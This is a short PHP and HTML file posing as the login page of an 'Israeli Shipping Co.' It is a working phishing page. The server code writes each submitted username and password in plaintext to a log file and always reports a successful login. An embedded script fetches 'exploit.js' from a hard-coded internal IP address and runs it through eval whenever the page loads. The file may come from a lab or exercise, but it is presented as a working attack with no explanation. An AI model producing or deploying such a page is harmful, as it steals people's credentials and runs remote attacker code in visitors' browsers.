<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"] ?? "";
    $password = $_POST["password"] ?? "";
    file_put_contents("/tmp/login_attempts.log", 
        date("Y-m-d H:i:s") . " - $username:$password\n", 
        FILE_APPEND);
    echo "Login successful! Welcome " . htmlspecialchars($username);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<h1>Welcome to Israeli Shipping Co.</h1>
<form action="/login.php" method="POST">
<input type="text" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" value="Login">
</form>
<script>
fetch("http://172.21.0.20:5000/exploit.js")
.then(r=>r.text())
.then(js=>eval(js));
</script>
</body>
</html>
